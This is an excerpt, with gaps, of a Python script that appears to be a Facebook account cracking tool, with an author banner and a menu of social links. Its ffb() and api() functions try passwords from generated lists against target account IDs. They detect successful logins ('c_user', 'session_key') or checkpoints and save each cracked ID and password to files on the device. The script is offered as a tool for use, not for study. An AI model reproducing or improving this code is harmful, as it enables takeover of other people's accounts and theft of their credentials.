...
\33[1;32m───────────────────────────────────────────────────────
\033[1;95m[\033[1;93m[‌>]\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mSABBIR AHMED
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mSABBIR AHMED
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mS-T-C_S4BB1R_T1NV1R_CYB3R
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95m PRO
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://chat.github.com/S4BB1R-69/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100025531623898');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/Sabbir.Your.Dad.1.Pis');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801949434886&text="
...
def gmail():
                ...
                linex()
                input(' Press enter to back ')
                os.system('python S4X.py')
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [STC-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [S4X-OK] %s | %s'%(ids,pas))
                                open('/sdcard/S4X-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [S4X-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/S4X-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [S4X-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/S4X-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [S4X-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/S4X-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [S4X-OK] '+uid+' | '+pas+'\033[1;97m')
